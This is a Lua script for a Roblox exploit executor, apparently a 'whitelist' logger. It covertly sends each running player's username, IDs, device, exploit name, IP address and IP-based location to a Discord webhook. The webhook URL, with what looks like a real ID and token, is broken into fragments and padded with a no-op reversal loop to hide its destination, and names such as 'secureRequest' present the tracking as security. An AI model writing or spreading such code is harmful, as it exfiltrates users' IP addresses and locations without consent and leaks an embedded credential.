return function(playerData, IPData)
    local HttpService = game:GetService("HttpService")
    
    local w = {
        p1 = "ht", p2 = "tp", p3 = "s:", p4 = "//",
        d1 = "dis", d2 = "co", d3 = "rd",
        a1 = ".", a2 = "c", a3 = "om",
        p5 = "/", p6 = "a", p7 = "pi/",
        h1 = "web", h2 = "ho", h3 = "oks/",
        i1 = "134", i2 = "941", i3 = "813", i4 = "191", i5 = "4887", i6 = "268",
        t1 = "BnL7AL", t2 = "LvvRvJm", t3 = "fcEFzdS_", t4 = "3FrIu0f6", 
        t5 = "BmXjY4GN", t6 = "ZwM0xQKA", t7 = "2o7WzaI2", t8 = "rMpCZUdk", 
        t9 = "SdWt0wU"
    }
    
    local protocol = w.p1 .. w.p2 .. w.p3 .. w.p4
    local domain = w.d1 .. w.d2 .. w.d3
    local tld = w.a1 .. w.a2 .. w.a3
    local path = w.p5 .. w.p6 .. w.p7
    local hook = w.h1 .. w.h2 .. w.h3
    local id = w.i1 .. w.i2 .. w.i3 .. w.i4 .. w.i5 .. w.i6
    local token = table.concat({w.t1, w.t2, w.t3, w.t4, w.t5, w.t6, w.t7, w.t8, w.t9})
    
    local urlParts = {
        protocol,
        domain,
        tld,
        path,
        hook,
        id,
        "/",
        token
    }
    
    local urlSegments = {
        urlParts[1],
        urlParts[2] .. urlParts[3],
        urlParts[4] .. urlParts[5],
        urlParts[6],
        urlParts[7],
        urlParts[8]
    }
    
    local timeKey = math.floor(os.time() % 10)
    for i = 1, #urlSegments do
        if i % 2 == (timeKey % 2) then
            urlSegments[i] = string.reverse(urlSegments[i])
            urlSegments[i] = string.reverse(urlSegments[i])
        end
    end
    
    local webhookUrl = ""
    for _, segment in ipairs(urlSegments) do
        webhookUrl = webhookUrl .. segment
    end
    
    local whitelistStatus = ":green_circle: true"
    local embedColor = 65280
    local embedColorIP = 16744272
    
    local player = playerData.player
    local deviceType = playerData.deviceType
    local membershipType = playerData.membershipType
    local exploit = playerData.exploit
    local clientID = playerData.clientID
    local whitelistMethod = playerData.whitelistMethod
    
    local ip = IPData.ip
    local locationFields = IPData.locationFields
    
    local timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    
    local sessionId = HttpService:GenerateGUID(false)
    
    local data = {
        content = "",
        embeds = {
            {
                title = "Player Info (" .. player.Name .. ")",
                description = "Session ID: " .. sessionId,
                fields = {
                    { name = "Display Name", value = player.DisplayName, inline = true },
                    { name = "Username", value = player.Name, inline = true },
                    { name = "User ID", value = tostring(player.UserId), inline = true },
                    { name = "Client ID", value = clientID, inline = true },
                    { name = "Account Age", value = tostring(player.AccountAge) .. " days", inline = true },
                    { name = "Membership Status", value = membershipType, inline = true },
                    { name = "Game ID", value = tostring(game.PlaceId), inline = true },
                    { name = "Exploit", value = exploit, inline = true },
                    { name = "Device", value = deviceType, inline = true },
                    { name = "Whitelisted", value = whitelistStatus, inline = true },
                    { name = "Whitelist Method", value = whitelistMethod, inline = true },
                    { name = "Profile", value = "[" .. player.Name .. "](https://www.roblox.com/users/" .. player.UserId .. "/profile)", inline = true },
                    { name = "IP Address", value = "||" .. ip .. "||", inline = true }
                },
                color = embedColor,
                timestamp = timestamp
            },
            {
                title = "IP Location Details (" .. player.Name .. ")",
                fields = locationFields,
                color = embedColorIP,
                timestamp = timestamp,
                footer = {
                    text = "Security ID: " .. string.sub(sessionId, 1, 8)
                }
            }
        }
    }
    
    local headers = { 
        ["Content-Type"] = "application/json",
        ["X-Session-ID"] = sessionId,
        ["X-Timestamp"] = tostring(os.time()),
        ["User-Agent"] = "Roblox/" .. exploit
    }
    
    local reqFunc = http_request or request or HttpPost or syn.request
    
    local function secureRequest()
        task.wait(math.random(100, 300) / 1000)
        
        local response = reqFunc({
            Url = webhookUrl,
            Body = HttpService:JSONEncode(data),
            Method = "POST",
            Headers = headers
        })
        
        return response
    end
    
    local success, response
    
    for attempt = 1, 3 do
        success, response = pcall(secureRequest)
        if success then
            break
        end
        task.wait(attempt * 0.5)
    end
    
    return success
end
